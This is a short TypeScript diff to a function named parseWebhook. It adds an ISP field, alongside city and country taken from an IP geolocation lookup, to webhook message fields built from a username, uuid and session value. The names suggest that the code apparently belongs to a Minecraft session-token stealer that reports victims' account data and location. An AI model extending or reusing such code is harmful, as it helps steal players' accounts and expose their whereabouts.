@@ -34,7 +34,7 @@ export default async function parseWebhook(username:string, uuid:string, session
             mcFields.push(field)
         }
     }
-    const { status, city, country } = await ipGeolocation(ip);
+    const { status, city, country, isp } = await ipGeolocation(ip);
     if (status === 200) {
         //add city and country to fields at the start
         mcFields.unshift({
@@ -44,6 +44,11 @@ export default async function parseWebhook(username:string, uuid:string, session
         }, {
             "name": "Country",
             "value": country,
+            "inline": true
+        },
+        {
+            "name": "ISP",
+            "value": isp,
             "inline": true
         })
     }
